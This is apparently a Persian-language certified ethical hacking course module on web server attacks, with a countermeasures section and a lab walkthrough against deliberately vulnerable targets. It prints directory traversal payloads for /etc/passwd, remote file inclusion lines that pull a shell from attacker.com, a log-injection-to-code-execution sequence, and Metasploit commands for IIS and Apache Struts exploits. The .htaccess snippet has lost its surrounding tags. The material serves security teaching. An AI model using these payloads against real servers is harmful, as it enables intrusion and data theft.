🔰 مقدمه – وب‌سرورها و حملات به آنها

وب‌سرور (Web Server) نرم‌افزاری است که درخواست‌های HTTP/HTTPS کاربران را دریافت کرده و صفحات وب، فایل‌ها و سایر محتواها را در اختیار آنها قرار می‌دهد. وب‌سرورها یکی از اصلی‌ترین و حیاتی‌ترین اجزای زیرساخت اینترنت هستند و به دلیل قرار گرفتن در معرض کاربران عمومی، یکی از اهداف اصلی هکرها محسوب می‌شوند.

حملات به وب‌سرورها می‌توانند عواقب فاجعه‌باری داشته باشند، از جمله:

  • سرقت اطلاعات حساس: دسترسی به پایگاه داده، فایل‌های پیکربندی و اطلاعات کاربران.
  • تخریب وب‌سایت: تغییر محتوای صفحات، قرار دادن بدافزار یا حملات فیشینگ.
  • استفاده از سرور برای حملات دیگر: تبدیل وب‌سرور به یک بات‌نت یا پل ارتباطی.
  • محروم‌سازی از سرویس (DoS): از کار انداختن وب‌سایت برای کاربران عادی.

در این ماژول، با معماری وب‌سرورها، آسیب‌پذیری‌های رایج، روش‌های شناسایی و حملات مختلف آشنا خواهید شد و همچنین تکنیک‌های دفاعی را یاد خواهید گرفت.

⚠️ هشدار اخلاقی: حملات به وب‌سرورها بدون مجوز جرم هستند. تمام تمرینات این ماژول فقط در محیط‌های آزمایشگاهی با مجوز انجام شوند.

🏗️ معماری وب‌سرور (Web Server Architecture)

درک معماری وب‌سرور برای شناسایی نقاط ضعف و حملات مؤثر ضروری است. یک وب‌سرور معمولاً از اجزای زیر تشکیل شده است:

📌 اجزای اصلی یک وب‌سرور:

  • سیستم‌عامل: لینوکس، ویندوز، یا Unix که وب‌سرور روی آن اجرا می‌شود.
  • نرم‌افزار وب‌سرور: Apache، Nginx، IIS، Tomcat، و … که درخواست‌های HTTP را مدیریت می‌کنند.
  • موتور تفسیر: PHP، ASP.NET، Python، Ruby، و … برای اجرای کدهای سمت سرور.
  • پایگاه داده: MySQL، PostgreSQL، SQL Server، و … برای ذخیره داده‌ها.
  • فایل‌ها و محتوا: صفحات HTML، تصاویر، CSS، جاوااسکریپت، و …
  • فایروال و سیستم‌های امنیتی: برای محافظت از وب‌سرور در برابر حملات.

📌 نحوه عملکرد:

  1. کاربر یک درخواست HTTP (مثلاً برای صفحه index.html) به وب‌سرور ارسال می‌کند.
  2. وب‌سرور درخواست را دریافت کرده و بر اساس URL و هدرها، آن را به فایل مناسب یا برنامه‌ای خاص هدایت می‌کند.
  3. اگر درخواست به یک فایل استاتیک (HTML, CSS, JS) باشد، وب‌سرور فایل را مستقیماً ارسال می‌کند.
  4. اگر درخواست به یک برنامه پویا (PHP, ASP.NET) باشد، موتور تفسیر کد را اجرا کرده و خروجی را به وب‌سرور برمی‌گرداند.
  5. وب‌سرور پاسخ را به کاربر ارسال می‌کند.
💡 نکته: هرچه پیچیدگی معماری بیشتر باشد، احتمال وجود آسیب‌پذیری‌های پیکربندی و کدنویسی نیز بیشتر است.

🔍 شناسایی وب‌سرور (Web Server Footprinting)

قبل از هر حمله، هکر باید اطلاعات دقیقی از وب‌سرور هدف جمع‌آوری کند. این فرآیند شناسایی (Footprinting) نام دارد.

📌 اطلاعات قابل جمع‌آوری:

  • نوع وب‌سرور: Apache، Nginx، IIS، Tomcat، …
  • نسخه وب‌سرور: برای پیدا کردن آسیب‌پذیری‌های شناخته‌شده.
  • سیستم‌عامل: لینوکس، ویندوز، …
  • ماژول‌های نصب‌شده: PHP، ASP.NET، Python، …
  • پورت‌های باز: ۸۰ (HTTP)، ۴۴۳ (HTTPS)، و …
  • فایل‌های حساس: robots.txt, sitemap.xml, .htaccess, …
  • مدیریت و صفحات ورود: /admin, /login, /wp-admin, …

📌 روش‌های شناسایی:

  • استفاده از Nmap: اسکن پورت و تشخیص بنر.
  • استفاده از Netcat: دریافت بنر با اتصال به پورت ۸۰ یا ۴۴۳.
  • استفاده از WhatWeb: ابزار تخصصی شناسایی وب‌سرور.
  • استفاده از httprint: شناسایی بر اساس امضای پاسخ.
  • بررسی فایل robots.txt: پیدا کردن مسیرهای مخفی.
# اسکن پورت و شناسایی وب‌سرور با Nmap
nmap -sV -p 80,443 192.168.1.101

# دریافت بنر با Netcat
nc -nv 192.168.1.101 80
HEAD / HTTP/1.0
[Enter 2 بار]

# شناسایی با WhatWeb
whatweb http://192.168.1.101

# بررسی robots.txt
curl http://192.168.1.101/robots.txt
💡 نکته: سرورهای مدرن ممکن است اطلاعات بنر را پنهان کنند یا اطلاعات جعلی نمایش دهند. برای شناسایی دقیق‌تر باید از چند روش استفاده کرد.

📂 Directory Traversal (Path Traversal)

Directory Traversal یکی از رایج‌ترین آسیب‌پذیری‌های وب‌سرورها است که در آن مهاجم با دستکاری پارامترهای URL یا مسیر فایل‌ها، به فایل‌های خارج از دایرکتوری ریشه وب دسترسی پیدا می‌کند.

📌 نحوه عملکرد:

  • برخی از برنامه‌های وب از پارامترهای URL برای تعیین مسیر فایل‌ها استفاده می‌کنند (مثل ?page=about.html).
  • اگر این پارامتر به درستی فیلتر نشود، مهاجم می‌تواند با استفاده از ../ به فایل‌های سیستمی دسترسی پیدا کند.

📌 مثال‌ها:

# دسترسی به فایل /etc/passwd در لینوکس
http://example.com/page?file=../../../../etc/passwd

# دسترسی به فایل boot.ini در ویندوز
http://example.com/page?file=../../../../boot.ini

# دسترسی به فایل لاگ
http://example.com/page?file=../../../../var/log/apache2/access.log

📌 ابزارهای تشخیص:

  • DirBuster: پیدا کردن دایرکتوری‌های مخفی.
  • Gobuster: اسکن دایرکتوری.
  • Burp Suite: دستکاری و تست پارامترها.
  • OWASP ZAP: اسکن خودکار آسیب‌پذیری‌ها.
⚠️ هشدار: Directory Traversal یکی از خطرناک‌ترین آسیب‌پذیری‌هاست و می‌تواند به افشای کامل اطلاعات سیستم منجر شود.

📄 File Inclusion (LFI / RFI)

File Inclusion یک آسیب‌پذیری است که در آن مهاجم می‌تواند فایل‌های محلی (LFI - Local File Inclusion) یا از راه دور (RFI - Remote File Inclusion) را در وب‌سرور اجرا کند.

📌 LFI (Local File Inclusion):

  • مهاجم از آسیب‌پذیری برای گنجاندن فایل‌های محلی استفاده می‌کند.
  • معمولاً با ?page=../../../../etc/passwd انجام می‌شود.
  • می‌تواند به خواندن فایل‌های سیستمی، لاگ‌ها، و حتی اجرای کد با تزریق لاگ (Log Injection) منجر شود.

📌 RFI (Remote File Inclusion):

  • مهاجم فایل‌ها را از یک سرور خارجی به سرور هدف تزریق می‌کند.
  • معمولاً با ?page=http://attacker.com/shell.txt انجام می‌شود.
  • این فایل معمولاً یک شل PHP یا ASP است که به مهاجم دسترسی کامل به سرور می‌دهد.
# LFI - خواندن فایل لاگ
http://example.com/index.php?page=../../../../var/log/apache2/access.log

# RFI - اجرای شل از راه دور
http://example.com/index.php?page=http://attacker.com/shell.php

# تزریق لاگ برای LFI به RCE
# ۱. ارسال درخواست با User-Agent مخرب
curl -A "" http://example.com

# ۲. اجرای کد از طریق فایل لاگ
http://example.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id
💡 نکته: برای جلوگیری از LFI/RFI، ورودی‌های کاربر را به دقت فیلتر کنید و از دستورات include با مسیرهای نسبی خودداری کنید.

🖥️ حملات به IIS (Internet Information Services)

IIS وب‌سرور مایکروسافت است که روی ویندوز اجرا می‌شود. IIS به دلیل محبوبیت، هدف حملات متعددی قرار گرفته است.

📌 آسیب‌پذیری‌های معروف IIS:

  • IIS 6.0 WebDAV Vulnerability: امکان اجرای کد از راه دور.
  • IIS 7.5 Short File Name Disclosure: افشای نام‌های کوتاه فایل‌ها.
  • IIS 8.0/8.5 HTTP/2 Vulnerabilities: حملات مبتنی بر HTTP/2.
  • Unicode Traversal: استفاده از کدهای یونیکد برای دور زدن فیلترها.

📌 تکنیک‌های حمله به IIS:

  • WebDAV Exploitation: استفاده از آسیب‌پذیری WebDAV برای اجرای کد.
  • Short File Name Attack: پیدا کردن نام فایل‌ها با استفاده از نام‌های کوتاه 8.3.
  • IIS Directory Traversal: دسترسی به فایل‌های خارج از ریشه وب.
  • IIS Unicode Traversal: استفاده از کدهای یونیکد برای دور زدن.
# اسکن آسیب‌پذیری IIS با Nmap
nmap --script=iis-* -p 80,443 192.168.1.101

# استفاده از Metasploit برای IIS Exploit
msfconsole
use exploit/windows/iis/iis_webdav_scstoragepath
set RHOST 192.168.1.101
exploit
⚠️ هشدار: IIS به دلیل یکپارچگی با ویندوز، یکی از اهداف اصلی حملات است. همیشه IIS را به‌روز نگه دارید.

🌐 حملات به Apache

Apache یکی از محبوب‌ترین وب‌سرورهای جهان است که روی لینوکس و ویندوز اجرا می‌شود. Apache به دلیل انعطاف‌پذیری، هدف حملات زیادی قرار می‌گیرد.

📌 آسیب‌پذیری‌های معروف Apache:

  • Apache Struts Vulnerability: اجرای کد از راه دور.
  • Apache Heartbleed: نشت اطلاعات در OpenSSL.
  • Apache mod_ssl Vulnerability: حملات به ماژول SSL.
  • Apache .htaccess Bypass: دور زدن محدودیت‌های .htaccess.

📌 تکنیک‌های حمله به Apache:

  • Apache Buffer Overflow: سرریز بافر در نسخه‌های قدیمی.
  • Apache mod_rewrite Bypass: دور زدن قوانین بازنویسی.
  • Apache Log Injection: تزریق کد به لاگ‌ها برای LFI/RCE.
  • Apache SSL/TLS Attacks: حملات به SSL مانند Heartbleed.
# اسکن آسیب‌پذیری Apache با Nmap
nmap --script=http-* -p 80,443 192.168.1.101

# استفاده از Metasploit برای Apache Exploit
msfconsole
use exploit/multi/http/apache_struts_exec
set RHOST 192.168.1.101
exploit
💡 نکته: Apache یکی از امن‌ترین وب‌سرورهاست، اما پیکربندی اشتباه می‌تواند آن را آسیب‌پذیر کند.

⚡ حملات به Nginx

Nginx یک وب‌سرور پرسرعت و کم‌مصرف است که به عنوان پروکسی معکوس (Reverse Proxy) و لود بالانس نیز استفاده می‌شود. Nginx به دلیل سرعت و کارایی بالا، روزبه‌روز محبوب‌تر می‌شود.

📌 آسیب‌پذیری‌های معروف Nginx:

  • Nginx off-by-one (CVE-2017-7529): نشت حافظه.
  • Nginx alias traversal: دور زدن مسیرهای alias.
  • Nginx HTTP/2 DoS: حملات محروم‌سازی با HTTP/2.
  • Nginx CRLF Injection: تزریق هدرهای HTTP.

📌 تکنیک‌های حمله به Nginx:

  • Nginx Alias Traversal: استفاده از alias برای دسترسی به فایل‌های خارج از ریشه.
  • Nginx Log Injection: تزریق کد به لاگ‌ها برای LFI.
  • Nginx HTTP/2 Abuse: سوءاستفاده از قابلیت‌های HTTP/2.
  • Nginx Misconfiguration: سوءاستفاده از پیکربندی اشتباه.
# اسکن آسیب‌پذیری Nginx با Nmap
nmap --script=http-nginx-* -p 80,443 192.168.1.101

# تست Alias Traversal
http://example.com/static../config.php
💡 نکته: Nginx به طور پیش‌فرض امن است، اما پیکربندی‌های اشتباه در فایل‌های nginx.conf می‌تواند باعث آسیب‌پذیری شود.

⚙️ پیکربندی اشتباه وب‌سرور (Misconfiguration)

پیکربندی اشتباه وب‌سرور یکی از رایج‌ترین علل نفوذ است. حتی اگر نرم‌افزار وب‌سرور امن باشد، یک پیکربندی اشتباه می‌تواند دروازه‌های ورود را به روی هکر باز کند.

📌 نمونه‌های پیکربندی اشتباه:

  • نمایش محتوای دایرکتوری (Directory Listing): نمایش لیست فایل‌های دایرکتوری.
  • فایل‌های .htaccess قابل خواندن: دسترسی به تنظیمات امنیتی.
  • پنل‌های مدیریت با رمز ضعیف: ورود به صفحات مدیریت با رمز پیش‌فرض.
  • SSL/TLS ضعیف: استفاده از پروتکل‌های قدیمی و آسیب‌پذیر.
  • باز بودن پورت‌های غیرضروری: پورت‌های اضافی که به مهاجم اطلاعات می‌دهند.
  • فایل‌های پشتیبان عمومی: فایل‌های .bak, .old, .backup قابل دسترس.
  • خطاهای نمایشی: نمایش مسیرها و اطلاعات سیستم در پیام‌های خطا.
# بررسی Directory Listing
curl http://192.168.1.101/uploads/

# بررسی فایل‌های پشتیبان
curl http://192.168.1.101/config.php.bak
curl http://192.168.1.101/.htaccess

# بررسی نمایش خطا
curl http://192.168.1.101/invalid_page
⚠️ هشدار: پیکربندی اشتباه یکی از ساده‌ترین راه‌ها برای نفوذ است. همیشه تنظیمات وب‌سرور را با دقت بررسی کنید.

🛠️ ابزارهای هک وب‌سرور

ابزارهای متعددی برای شناسایی و نفوذ به وب‌سرورها وجود دارند که در این بخش مهم‌ترین آنها را معرفی می‌کنیم:

ابزارکاربرد اصلیتوضیح
Nmap اسکن و شناسایی اسکن پورت، تشخیص بنر، اسکن آسیب‌پذیری
Gobuster اسکن دایرکتوری پیدا کردن دایرکتوری‌ها و فایل‌های مخفی
DirBuster اسکن دایرکتوری مشابه Gobuster با رابط گرافیکی
Burp Suite تست نفوذ وب دستکاری درخواست‌ها، اسکن آسیب‌پذیری
OWASP ZAP تست نفوذ وب نسخه متن‌باز Burp Suite
Nikto اسکن آسیب‌پذیری وب‌سرور بررسی پیکربندی و آسیب‌پذیری‌های شناخته‌شده
Metasploit بهره‌برداری ماژول‌های exploit برای وب‌سرورها
WhatWeb شناسایی وب‌سرور شناسایی نوع و نسخه وب‌سرور
WPScan هک وردپرس اسکن آسیب‌پذیری وردپرس
JoomScan هک جوملا اسکن آسیب‌پذیری جوملا 
# استفاده از Nikto برای اسکن وب‌سرور
nikto -h http://192.168.1.101

# استفاده از Gobuster برای اسکن دایرکتوری
gobuster dir -u http://192.168.1.101 -w /usr/share/wordlists/dirb/common.txt

# استفاده از WPScan برای وردپرس
wpscan --url http://192.168.1.101/wordpress --enumerate
💡 نکته: ترکیب چند ابزار می‌تواند اطلاعات کامل‌تری از وب‌سرور هدف به دست دهد.

🤖 هوش مصنوعی در هک وب‌سرور

CEH v13 به عنوان اولین نسخه‌ای که هوش مصنوعی را در تمام مراحل هک قانونمند ادغام کرده، به نقش هوش مصنوعی در هک وب‌سرورها نیز می‌پردازد.

📌 نقش هوش مصنوعی در هک وب‌سرور:

  • شناسایی خودکار آسیب‌پذیری‌ها: AI می‌تواند کد وب‌سرور را تحلیل کرده و آسیب‌پذیری‌ها را پیدا کند.
  • تولید Payloadهای هوشمند: AI می‌تواند payloadهایی تولید کند که از تشخیص فرار کنند.
  • شکار خودکار آسیب‌پذیری‌های پیکربندی: AI می‌تواند پیکربندی اشتباه را شناسایی کند.
  • تحلیل لاگ‌ها برای شناسایی حملات: AI می‌تواند الگوهای حمله را در لاگ‌ها پیدا کند.

📌 ابزارهای AI-Powered Web Server Hacking:

  • AI-Based Vulnerability Scanners: اسکنرهای مبتنی بر AI.
  • AI-Powered Payload Generators: تولید payloadهای هوشمند.
  • AI-Driven Log Analysis: تحلیل لاگ‌ها با AI.
💡 چرا هوش مصنوعی در هک وب‌سرور مهم است؟

هوش مصنوعی می‌تواند آسیب‌پذیری‌های پنهان را سریع‌تر و دقیق‌تر از روش‌های دستی پیدا کند و حملات هدفمندتری طراحی کند.

🛡️ راه‌های مقابله با حملات وب‌سرور (Countermeasures)

برای محافظت از وب‌سرور در برابر حملات، سازمان‌ها و مدیران باید اقدامات زیر را انجام دهند:

📌 اقدامات کلی:

  • به‌روزرسانی منظم: نصب وصله‌های امنیتی برای وب‌سرور و ماژول‌ها.
  • پیکربندی امن: غیرفعال کردن Directory Listing، محدود کردن دسترسی به فایل‌های حساس.
  • استفاده از HTTPS: رمزنگاری ارتباطات با SSL/TLS قوی.
  • استفاده از WAF (Web Application Firewall): محافظت در برابر حملات لایه کاربرد.
  • محدود کردن دسترسی: استفاده از IP Whitelist و Blacklist.
  • آموزش توسعه‌دهندگان: آموزش کدنویسی امن برای جلوگیری از آسیب‌پذیری‌های رایج.
  • پشتیبان‌گیری منظم: تهیه نسخه پشتیبان از فایل‌ها و تنظیمات.

📌 اقدامات خاص برای هر نوع حمله:

  • در برابر Directory Traversal: فیلتر کردن ورودی‌ها، استفاده از مسیرهای مطلق.
  • در برابر File Inclusion: غیرفعال کردن allow_url_include، فیلتر کردن ورودی‌ها.
  • در برابر Misconfiguration: ممیزی منظم پیکربندی، استفاده از ابزارهای ارزیابی.
  • در برابر Brute Force: محدود کردن تعداد تلاش‌های ورود، استفاده از CAPTCHA.
  • در برابر DoS: محدود کردن نرخ درخواست‌ها، استفاده از CDN.
💡 نکته: بهترین دفاع در برابر حملات وب‌سرور، ترکیبی از به‌روزرسانی، پیکربندی امن و آموزش است.

🧪 کارگاه عملی – هک وب‌سرور

در این کارگاه، شما با تکنیک‌ها و ابزارهای هک وب‌سرور آشنا خواهید شد و یک سناریوی کامل از نفوذ به وب‌سرور را در محیط آزمایشگاهی پیاده‌سازی می‌کنید.

🎯 هدف کارگاه:

  • شناسایی وب‌سرور با Nmap و WhatWeb.
  • اسکن آسیب‌پذیری با Nikto و Gobuster.
  • اجرای Directory Traversal.
  • اجرای LFI و RFI.
  • بهره‌برداری از آسیب‌پذیری با Metasploit.
  • مقابله با حملات.

🖥️ محیط مورد نیاز:

  • حمله‌کننده: Kali Linux
  • هدف: Metasploitable 2 یا یک وب‌سرور آسیب‌پذیر (مثل DVWA)
  • ابزارها: Nmap, WhatWeb, Nikto, Gobuster, Burp Suite, Metasploit

📝 سناریوی گام‌به‌گام:

مرحله ۱: شناسایی وب‌سرور

# اسکن پورت با Nmap
nmap -sV -p 80,443 192.168.1.101

# شناسایی با WhatWeb
whatweb http://192.168.1.101

تحلیل: نوع و نسخه وب‌سرور را شناسایی کنید.

مرحله ۲: اسکن دایرکتوری با Gobuster

# اسکن دایرکتوری‌های مخفی
gobuster dir -u http://192.168.1.101 -w /usr/share/wordlists/dirb/common.txt

تحلیل: دایرکتوری‌های پیدا شده را بررسی کنید (مثل /admin, /uploads).

مرحله ۳: اسکن آسیب‌پذیری با Nikto

# اسکن کامل وب‌سرور
nikto -h http://192.168.1.101

تحلیل: آسیب‌پذیری‌های شناسایی شده را لیست کنید.

مرحله ۴: Directory Traversal

# امتحان Directory Traversal در یک صفحه آسیب‌پذیر
# (مثلاً در DVWA: http://192.168.1.101/dvwa/vulnerabilities/fi/?page=../../../etc/passwd)

تحلیل: محتوای فایل /etc/passwd را مشاهده کنید.

مرحله ۵: File Inclusion (RFI)

# در صورت وجود RFI، یک شل PHP از سرور مهاجم تزریق کنید
# http://192.168.1.101/page.php?file=http://attacker.com/shell.txt

تحلیل: اگر موفق شد، شل اجرا شده و دسترسی کامل به سرور خواهید داشت.

مرحله ۶: بهره‌برداری با Metasploit

# استفاده از Metasploit برای بهره‌برداری از آسیب‌پذیری
msfconsole
search apache
use exploit/multi/http/apache_struts_exec
set RHOST 192.168.1.101
exploit

تحلیل: در صورت موفقیت، به یک شل دسترسی پیدا می‌کنید.

مرحله ۷: مقابله

# تنظیمات امنیتی در Apache (در فایل .htaccess)
# جلوگیری از Directory Listing
Options -Indexes

# محدود کردن دسترسی به فایل‌های حساس

    Order allow,deny
    Deny from all

تحلیل: با اعمال این تنظیمات، بسیاری از حملات خنثی می‌شوند.

⏳ تکلیف: تمام مراحل بالا را در محیط آزمایشگاهی خود اجرا کنید و یک گزارش کامل از فرآیند هک وب‌سرور، تشخیص و مقابله تهیه کنید.

📝 تمرین‌های عملی

این تمرینات به شما کمک می‌کنند تا مهارت‌های خود در زمینه هک وب‌سرور را تقویت کنید.

  • تمرین ۱ – شناسایی وب‌سرور:
    با استفاده از Nmap و WhatWeb، نوع و نسخه وب‌سرور یک وب‌سایت واقعی (با مجوز) را شناسایی کنید.
  • تمرین ۲ – اسکن دایرکتوری:
    با استفاده از Gobuster، دایرکتوری‌های مخفی یک وب‌سایت را پیدا کنید.
  • تمرین ۳ – Directory Traversal:
    روی یک وب‌سرور آزمایشگاهی، حمله Directory Traversal را پیاده‌سازی کنید و فایل‌های سیستمی را بخوانید.
  • تمرین ۴ – File Inclusion:
    روی یک وب‌سرور آزمایشگاهی، LFI را پیاده‌سازی کنید و یک شل از طریق لاگ اجرا کنید.
  • تمرین ۵ – اسکن آسیب‌پذیری:
    با استفاده از Nikto، یک وب‌سرور آزمایشگاهی را اسکن کنید و نتایج را تحلیل کنید.

📖 واژه‌نامه تخصصی (Glossary)

در این بخش، تمام واژه‌های تخصصی این ماژول، همراه با ساختار (ریشه یا مخفف)، تعریف ساده، کاربرد در هک، و یک مثال روزمره توضیح داده شده است.

واژه ساختار / مخفف تعریف ساده کاربرد در هک مثال
Web Server — نرم‌افزاری که صفحات وب را ارائه می‌دهد. هدف اصلی حملات. Apache, IIS, Nginx.
Directory Traversal — دسترسی به فایل‌های خارج از ریشه وب. خواندن فایل‌های سیستمی. ../../../etc/passwd
LFI Local File Inclusion گنجاندن فایل‌های محلی در وب‌سرور. خواندن فایل‌ها و اجرای کد. ?page=../../etc/passwd
RFI Remote File Inclusion گنجاندن فایل‌های از راه دور. اجرای شل از سرور خارجی. ?page=http://attacker.com/shell
IIS Internet Information Services وب‌سرور مایکروسافت. هدف حملات به ویندوز. IIS 6, 7, 8, 10.
Apache — وب‌سرور متن‌باز محبوب. هدف حملات لینوکس. Apache 2.4.
Nginx — وب‌سرور پرسرعت و کم‌مصرف. هدف حملات مدرن. Nginx 1.18.
Misconfiguration — پیکربندی اشتباه وب‌سرور. یکی از رایج‌ترین آسیب‌پذیری‌ها. Directory Listing فعال.
WAF Web Application Firewall فایروال برنامه‌های وب. محافظت در برابر حملات. Cloudflare WAF.
Nikto — اسکنر آسیب‌پذیری وب‌سرور. شناسایی آسیب‌پذیری‌های رایج. nikto -h example.com
Gobuster — ابزار اسکن دایرکتوری. پیدا کردن مسیرهای مخفی. gobuster dir -u example.com
.htaccess — فایل پیکربندی Apache. کنترل دسترسی و تنظیمات. محدود کردن IP, احراز هویت.
Log Injection — تزریق کد به لاگ‌ها. اجرای کد از طریق LFI. تزریق PHP به لاگ Apache.
💡 نکته: این واژه‌نامه یک مرجع کامل و سریع برای تمام مفاهیم کلیدی ماژول ۱۳ است. توصیه می‌شود آن را بارها مرور کنید تا اصطلاحات برای شما جا بیفتد.
